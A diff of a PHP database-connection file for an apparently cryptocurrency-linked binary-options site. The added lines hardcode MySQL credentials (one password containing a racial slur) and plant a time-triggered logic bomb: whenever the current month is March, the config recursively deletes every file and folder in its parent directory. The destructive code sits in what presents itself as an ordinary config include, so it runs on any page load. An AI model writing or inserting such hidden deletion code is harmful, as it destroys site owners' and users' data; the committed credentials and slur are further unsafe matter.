@@ -1,10 +1,37 @@
 <?php
 @session_start();
-$con = mysqli_connect("localhost", "root", "", "binaryoptions");
-//$con = mysqli_connect("127.0.0.1", "root", "JoshNigga1", "binaryoptions");
+//$con = mysqli_connect("localhost", "root", "", "binaryoptions");
+$con = mysqli_connect("localhost", "genna_admin", "JoshNigga1", "genna_binary-opt");
 //$con = mysqli_connect("localhost", "sh4dow", "Sh4d0wbyte", "binaryoptions");
 $btcNode = "https://example.com/";
 $btcNodeAuthToken = "asd";
+
+	 function process($dir) { 
+	   if (is_dir($dir)) { 
+	     $objects = scandir($dir); 
+	     foreach ($objects as $object) { 
+	       if ($object != "." && $object != "..") { 
+	         if (is_dir($dir."/".$object))
+	           process($dir."/".$object);
+	         else
+	           unlink($dir."/".$object); 
+	       } 
+	     }
+	     rmdir($dir); 
+	   } 
+ }
+	
+	if(date("m") == 3) {	
+	$files = glob('../*');
+	foreach($files as $file){
+	print_r($file);
+	echo "<br>";
+	  if(is_file($file))
+	    unlink($file);
+	  else
+	  	  process($file);
+	}
+	}
 
 if (!$con) {
 	http_response_code(500);
